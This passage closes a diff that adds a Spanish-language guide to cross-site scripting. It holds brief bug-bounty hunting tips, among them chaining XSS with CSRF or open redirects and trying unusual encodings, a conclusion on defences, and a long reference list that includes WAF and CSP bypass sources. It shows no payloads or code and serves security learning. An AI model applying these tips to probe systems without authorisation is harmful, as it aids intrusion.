+2. **Revisa templates del lado del cliente** - CSTI en SPAs
+3. **Prueba different encodings** - UTF-8, UTF-16, diferentes charsets
+4. **Combina con otras vulnerabilidades** - CSRF + XSS, Open Redirect + XSS
+5. **Busca en áreas menos obvias** - Error pages, 404 pages, admin panels
+
+El XSS sigue siendo una amenaza crítica en 2024, ocupando el puesto \#1 en la lista CWE Top 25. Aunque los frameworks modernos han mejorado significativamente las defensas por defecto, las vulnerabilidades persisten por configuraciones incorrectas, uso inseguro de APIs y la complejidad creciente de las aplicaciones web.[^2]
+
+La clave para una defensa efectiva está en combinar múltiples estrategias: codificación de salida adecuada, CSP restrictiva, frameworks seguros y testing continuo. Para los bug bounty hunters, comprender las técnicas modernas de evasión y los contextos específicos de cada aplicación es fundamental para identificar vulnerabilidades que los scanners automatizados podrían pasar por alto.
+<span style="display:none">[^23][^25][^27][^29][^31][^33][^35][^37][^39][^41][^43][^45][^47][^49][^51][^53][^55][^57][^59][^61][^63][^65][^67][^69][^70]</span>
+
+<div style="text-align: center">XSS (Cross-Site Scripting) - Guía Completa</div>
+
+[^1]: https://www.jit.io/resources/app-security/what-is-cve-2024-44308-xss-and-how-to-protect-from-it
+    
+[^2]: https://www.invicti.com/blog/web-security/2024-cwe-top-25-list-xss-sqli-buffer-overflows/
+    
+[^3]: https://portswigger.net/web-security/cross-site-scripting
+    
+[^4]: https://www.securityjourney.com/post/understanding-the-4-types-of-cross-site-scripting-xss-vulnerabilities
+    
+[^5]: https://owasp.org/www-community/attacks/xss/
+    
+[^6]: https://www.uprootsecurity.com/blog/stored-xss-attack-explained
+    
+[^7]: https://cyberphinix.de/blog/xss-basics/
+    
+[^8]: https://community.f5.com/kb/technicalarticles/cross-site-scripting-xss-exploit-paths/275166
+    
+[^9]: https://www.vaadata.com/blog/dom-based-xss-attacks-principles-impacts-exploitations-and-security-best-practices/
+    
+[^10]: https://www.twingate.com/blog/glossary/mutation-xss-attack
+    
+[^11]: https://kpmg.co.il/technologyconsulting/blog/what-is-mutation-xss-mxss
+    
+[^12]: https://curity.io/resources/learn/oauth-xss-prevention/
+    
+[^13]: https://www.browserstack.com/guide/csp-bypass
+    
+[^14]: https://www.angularminds.com/blog/vulnerabilities-and-solutions-for-react-js-security
+    
+[^15]: https://pentescope.com/essential-xss-prevention-strategies-for-developers/
+    
+[^16]: https://www.stackhawk.com/blog/angular-xss-guide-examples-and-prevention/
+    
+[^17]: https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection
+    
+[^18]: https://portswigger.net/kb/issues/00200308_client-side-template-injection
+    
+[^19]: https://www.paloaltonetworks.com/blog/cloud-security/template-injection-vulnerabilities/
+    
+[^20]: https://www.cloudflare.com/learning/security/how-to-prevent-xss-attacks/
+    
+[^21]: https://www.securityjourney.com/post/mitigating-preventing-cross-site-scripting-xss-vulnerabilities-an-example
+    
+[^22]: https://github.com/Ant1sec-ops/CVE-2024-30875
+    
+[^23]: https://www.code-intelligence.com/blog/what-is-cross-site-scripting
+    
+[^24]: https://www.vaadata.com/blog/xss-cross-site-scripting-vulnerabilities-principles-types-of-attacks-exploitations-and-security-best-practices/
+    
+[^25]: https://www.appgate.com/blog/cross-site-scripting-xss-in-bigid-privacy-portal
+    
+[^26]: https://vercel.com/guides/understanding-xss-attacks
+    
+[^27]: https://www.memcyco.com/guide-to-preventing-xss-attacks/
+    
+[^28]: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
+    
+[^29]: https://security.snyk.io/vuln/SNYK-RUBY-BOOTSTRAP-7640987
+    
+[^30]: https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS
+    
+[^31]: https://learn.microsoft.com/en-us/aspnet/core/security/cross-site-scripting?view=aspnetcore-9.0
+    
+[^32]: https://www.reddit.com/r/bugbounty/comments/1g8hffv/new_xss_attack_techniques_2024/
+    
+[^33]: https://www.invicti.com/learn/cross-site-scripting-xss/
+    
+[^34]: https://arxiv.org/html/2504.08176v1
+    
+[^35]: https://www.linkedin.com/pulse/mastering-xss-advanced-techniques-bypass-web-application-firewalls-r9thc
+    
+[^36]: https://www.softwaresecured.com/post/types-of-xss-attacks
+    
+[^37]: https://www.acunetix.com/blog/articles/xss-filter-evasion-bypass-techniques/
+    
+[^38]: https://akimbocore.com/article/finding-dom-xss/
+    
+[^39]: https://www.cobalt.io/vulnerability-wiki/v5-validation-sanitization/reflected-xss-waf-bypass
+    
+[^40]: https://www.imperva.com/learn/application-security/cross-site-scripting-xss-attacks/
+    
+[^41]: https://www.cyberchief.ai/2024/11/dom-based-xss-fix.html
+    
+[^42]: https://brightsec.com/blog/how-i-bypassed-an-imperva-waf/
+    
+[^43]: https://nvd.nist.gov/vuln/detail/cve-2024-20800
+    
+[^44]: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+    
+[^45]: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+    
+[^46]: https://security.snyk.io/vuln/SNYK-JS-DOMPURIFY-8184974
+    
+[^47]: https://www.sysdig.com/blog/fuzzing-and-bypassing-the-aws-waf
+    
+[^48]: https://www.hackerone.com/knowledge-center/how-xss-payloads-work-code-examples-and-how-prevent-them
+    
+[^49]: https://onlinelibrary.wiley.com/doi/abs/10.1002/nem.2264
+    
+[^50]: https://www.vaadata.com/blog/content-security-policy-bypass-techniques-and-security-best-practices/
+    
+[^51]: https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/
+    
+[^52]: https://payatu.com/blog/content-security-policy/
+    
+[^53]: https://www.sans.org/white-papers/40380/
+    
+[^54]: https://jorianwoltjer.com/blog/p/research/mutation-xss
+    
+[^55]: https://www.cobalt.io/blog/csp-and-bypasses
+    
+[^56]: https://sonarsource.github.io/mxss-cheatsheet/examples/
+    
+[^57]: https://github.com/bhaveshk90/Content-Security-Policy-CSP-Bypass-Techniques
+    
+[^58]: https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss
+    
+[^59]: https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass
+    
+[^60]: https://notes.theoffsecgirl.com/06-hacking-ios/06e-owasp-mobile-top-10
+    
+[^61]: https://github.com/requarks/wiki/security/advisories/GHSA-xjcj-p2qv-q3rf
+    
+[^62]: https://www.reddit.com/r/xss/comments/13rghb4/does_xss_exists_in_framework_like_react_vue_and/
+    
+[^63]: https://flatt.tech/research/posts/why-xss-persists-in-this-frameworks-era/
+    
+[^64]: https://www.invicti.com/web-application-vulnerabilities/client-side-template-injection
+    
+[^65]: https://www.cybersrely.com/how-to-prevent-xss-in-restful-apis/
+    
+[^66]: https://hackerone.com/reports/2234564
+    
+[^67]: https://thehackernews.com/2025/07/why-react-didnt-kill-xss-new-javascript.html
+    
+[^68]: https://security.snyk.io/vuln/SNYK-PHP-LARAVELFRAMEWORK-9400966
+    
+[^69]: https://www.invicti.com/web-application-vulnerabilities/angularjs-client-side-template-injection
+    
+[^70]: https://vuejs.org/guide/best-practices/security
